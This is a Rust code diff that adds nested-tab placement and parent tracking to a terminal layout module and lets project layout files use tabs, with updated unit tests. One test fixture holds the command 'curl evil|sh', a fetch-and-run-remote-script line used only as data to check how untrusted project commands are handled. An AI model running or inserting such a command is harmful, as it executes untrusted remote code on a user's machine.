@@ -205,6 +205,14 @@ pub struct Place {
     pub ratio: f64,
 }
 
+/// A [`Place`] with `of` resolved to the index of a tab in [`TabLayout::tab_plan`].
+#[derive(Debug, Clone, PartialEq)]
+pub struct ResolvedPlace {
+    pub direction: SplitDirection,
+    pub of: usize,
+    pub ratio: f64,
+}
+
 /// One tab of a layout. A flat tab (one terminal) is read as a `root` leaf.
 #[derive(Debug, Clone, PartialEq, Serialize)]
 pub struct Tab {
@@ -556,9 +564,10 @@ pub fn resolve_origin(
         && let Ok(data) = serde_json::from_str::<Value>(text)
         && !data["layout"].is_null()
     {
-        // Project files stay on `panes[]`: `trust::Sources::commands` lists only those.
-        return parse_layout_value(&data["layout"])
-            .map(|l| (l.to_tabs(), Vec::new(), true))
+        // `tabs[]` or `panes[]`: `trust::Sources::commands` lists the commands of both (the
+        // project parser flattens the tabs to panes).
+        return parse_tabs_value(&data["layout"])
+            .map(|(tabs, warnings)| (tabs, warnings, true))
             .map_err(|e| format!("{path}: layout: {e}"));
     }
     if let Some((path, text)) = legacy {
@@ -602,6 +611,16 @@ impl TabLayout {
     /// name gets a number, so every `from` names one pane. `cwd` and `place` are not carried (the
     /// panes have no such field).
     pub fn pane_tabs(&self) -> Vec<Vec<PaneSpec>> {
+        self.tab_plan()
+            .into_iter()
+            .map(|(_, panes)| panes)
+            .collect()
+    }
+
+    /// [`pane_tabs`](Self::pane_tabs) with the nesting: for each tab the index (in the same list)
+    /// of the tab it is a child of, `None` for a top-level tab. A parent's index is always lower
+    /// than its children's.
+    pub fn tab_plan(&self) -> Vec<(Option<usize>, Vec<PaneSpec>)> {
         fn first(node: &Node) -> (&Option<String>, &Option<String>) {
             match node {
                 Node::Split { children, .. } => first(&children[0]),
@@ -639,7 +658,7 @@ impl TabLayout {
                 emit(&children[1], &second, out, used);
             }
         }
-        fn tab(t: &Tab, all: &mut Vec<Vec<PaneSpec>>) {
+        fn tab(t: &Tab, parent: Option<usize>, all: &mut Vec<(Option<usize>, Vec<PaneSpec>)>) {
             let mut used = HashSet::new();
             let (name, command) = first(&t.root);
             let fallback = t.name.as_deref().unwrap_or("shell");
@@ -650,16 +669,51 @@ impl TabLayout {
                 split: None,
             }];
             emit(&t.root, &root, &mut panes, &mut used);
-            all.push(panes);
+            let me = all.len();
+            all.push((parent, panes));
             for c in &t.children {
-                tab(c, all);
+                tab(c, Some(me), all);
             }
         }
         let mut all = Vec::new();
         for t in &self.tabs {
-            tab(t, &mut all);
+            tab(t, None, &mut all);
         }
         all
+    }
+
+    /// The placement of each tab of [`tab_plan`](Self::tab_plan) (same order) with `of` resolved to
+    /// the index of a tab in that list: the named tab, else the parent, else the first tab. A tab
+    /// without `place`, or whose target is itself (the first tab), has none.
+    pub fn tab_places(&self) -> Vec<Option<ResolvedPlace>> {
+        fn walk<'a>(
+            tabs: &'a [Tab],
+            parent: Option<usize>,
+            out: &mut Vec<(&'a Tab, Option<usize>)>,
+        ) {
+            for t in tabs {
+                let me = out.len();
+                out.push((t, parent));
+                walk(&t.children, Some(me), out);
+            }
+        }
+        let mut all = Vec::new();
+        walk(&self.tabs, None, &mut all);
+        all.iter()
+            .enumerate()
+            .map(|(i, (t, parent))| {
+                let p = t.place.as_ref()?;
+                let of = match &p.of {
+                    Some(n) => all.iter().position(|(o, _)| o.name.as_deref() == Some(n))?,
+                    None => parent.unwrap_or(0),
+                };
+                (of != i).then_some(ResolvedPlace {
+                    direction: p.direction,
+                    of,
+                    ratio: p.ratio,
+                })
+            })
+            .collect()
     }
 
     /// Every pane of every tab in [`pane_tabs`](Self::pane_tabs) order, for what lists or shows the
@@ -829,11 +883,14 @@ mod tests {
     }
 
     #[test]
-    fn project_layouts_with_tabs_are_refused_so_trust_lists_every_command() {
-        let tabs = r#"{"tabs":[{"name":"x","command":"curl evil|sh"}]}"#;
+    fn project_layouts_may_use_tabs_and_the_deprecated_file_may_not() {
+        let tabs = r#"{"tabs":[{"name":"x","command":"curl evil|sh","children":[{"name":"y","place":{"direction":"down"}}]}]}"#;
         let project = format!(r#"{{"layout":{tabs}}}"#);
-        let err = resolve_origin(Some((PROJECT, &project)), None, None).unwrap_err();
-        assert!(err.starts_with(PROJECT) && err.contains("panes"), "{err}");
+        let (layout, _, from_project) =
+            resolve_origin(Some((PROJECT, &project)), None, None).unwrap();
+        assert!(from_project);
+        assert_eq!(layout.tabs[0].children.len(), 1);
+        assert!(layout.tabs[0].children[0].place.is_some());
         let err = resolve_origin(None, Some((FILE, tabs)), None).unwrap_err();
         assert!(err.starts_with(FILE) && err.contains("panes"), "{err}");
     }
@@ -1049,6 +1106,45 @@ mod tests {
     #[test]
     fn pane_tabs_rebuild_the_default_panes_in_order() {
         assert_eq!(default_tabs().pane_tabs(), vec![default_layout().panes]);
+    }
+
+    #[test]
+    fn tab_places_resolve_of_to_a_tab_index() {
+        let l = parse_tabs_value(&serde_json::json!({"tabs":[
+            {"name":"claude","children":[
+                {"name":"Terminal","place":{"direction":"right","ratio":0.6}},
+                {"name":"Logs","place":{"direction":"down","of":"Terminal"}},
+                {"name":"Free"}]},
+            {"name":"other","place":{"direction":"down"}},
+            {"name":"first","place":{"direction":"right","of":"claude"}}
+        ]}))
+        .unwrap()
+        .0;
+        let places = l.tab_places();
+        assert_eq!(places.len(), 6);
+        assert_eq!(places[0], None);
+        let t = places[1].as_ref().unwrap();
+        assert_eq!(
+            (t.of, t.direction, t.ratio),
+            (0, SplitDirection::Right, 0.6)
+        );
+        assert_eq!(places[2].as_ref().unwrap().of, 1);
+        assert_eq!(places[3], None);
+        // A top-level tab without `of` is placed against the first tab.
+        assert_eq!(places[4].as_ref().unwrap().of, 0);
+        assert_eq!(places[5].as_ref().unwrap().of, 0);
+    }
+
+    #[test]
+    fn tab_plan_names_the_parent_of_each_tab() {
+        let l = parse_tabs_value(&serde_json::json!({"tabs":[
+            {"name":"claude","children":[{"name":"Terminal"},{"name":"Logs","children":[{"name":"Deep"}]}]},
+            {"name":"other"}
+        ]}))
+        .unwrap()
+        .0;
+        let parents: Vec<_> = l.tab_plan().into_iter().map(|(p, _)| p).collect();
+        assert_eq!(parents, [None, Some(0), Some(0), Some(2), None]);
     }
 
     #[test]
